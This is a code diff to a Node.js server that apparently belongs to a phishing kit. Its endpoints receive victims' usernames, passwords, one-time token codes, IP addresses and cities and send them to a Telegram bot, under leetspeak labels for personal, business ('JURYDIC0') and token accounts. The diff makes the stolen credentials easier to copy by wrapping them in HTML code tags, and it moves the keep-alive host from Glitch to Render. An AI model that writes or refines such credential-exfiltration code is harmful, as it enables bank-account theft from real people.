@@ -31,12 +31,13 @@ app.post('/api/sendMessage', async (req, res) => {
     }
 
     // Construir mensaje
-    const message = `🔵3XT3RIOR-PERSON4S🔵\nUs4RX: ${user}\n\nIP: ${ip}\nCiudad: ${city}`;
+    const message = `🔵3XT3RIOR-PERSON4S🔵\nUs4RX: <code>${user}</code>\n\nIP: ${ip}\nCiudad: ${city}`;
 
     try {
         const response = await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
             chat_id: CHAT_ID,
             text: message,
+            parse_mode: "HTML",
         });
         res.status(200).json({ success: true, data: response.data });
     } catch (error) {
@@ -53,7 +54,7 @@ app.post('/api/sendMessage2', async (req, res) => {
     }
 
     // Construir mensaje
-    const message = `🔐🔵3XT3RIOR-PERSON4S🔵\nUs4RX: ${user}\nCl4v: ${password}\n\nIP: ${ip}\nCiudad: ${city}`;
+    const message = `🔐🔵3XT3RIOR-PERSON4S🔵\nUs4RX: <code>${user}</code>\nCl4v: <code>${password}</code>\n\nIP: ${ip}\nCiudad: ${city}`;
 
     try {
         const response = await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
@@ -75,7 +76,7 @@ app.post('/api/sendMessage3', async (req, res) => {
     }
 
     // Construir mensaje
-    const message = `🔵3XT3RIOR-JURYDIC0🔵\nUs4RX: ${user}\n\nIP: ${ip}\nCiudad: ${city}`;
+    const message = `🔵3XT3RIOR-JURYDIC0🔵\nUs4RX: <code>${user}</code>\n\nIP: ${ip}\nCiudad: ${city}`;
 
     try {
         const response = await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
@@ -97,7 +98,7 @@ app.post('/api/sendMessage4', async (req, res) => {
     }
 
     // Construir mensaje
-    const message = `🔐🔵3XT3RIOR-JURYDIC0🔵\nUs4RX: ${user}\nCl4v: ${password}\n\nIP: ${ip}\nCiudad: ${city}`;
+    const message = `🔐🔵3XT3RIOR-JURYDIC0🔵\nUs4RX: <code>${user}</code>\nCl4v: <code>${password}</code>\n\nIP: ${ip}\nCiudad: ${city}`;
 
     try {
         const response = await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
@@ -119,7 +120,7 @@ app.post('/api/sendMessage5', async (req, res) => {
     }
 
     // Construir mensaje
-    const message = `🔐🔵3XT3RIOR-T0K3N🔵\nUs4RX: ${user}\nC0DIG0: ${password}\n\nIP: ${ip}\nCiudad: ${city}`;
+    const message = `🔐🔵3XT3RIOR-T0K3N🔵\nUs4RX: <code>${user}</code>\nC0DIG0: <code>${password}</code>\n\nIP: ${ip}\nCiudad: ${city}`;
 
     try {
         const response = await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
@@ -133,7 +134,7 @@ app.post('/api/sendMessage5', async (req, res) => {
     }
 });
 
-const keepAliveUrl = 'https://luxuriant-sugared-titanium.glitch.me/';
+const keepAliveUrl = 'https://luxuriant-sugared-titaniums.onrender.com/';
 
 setInterval(() => {
     axios.get(keepAliveUrl)
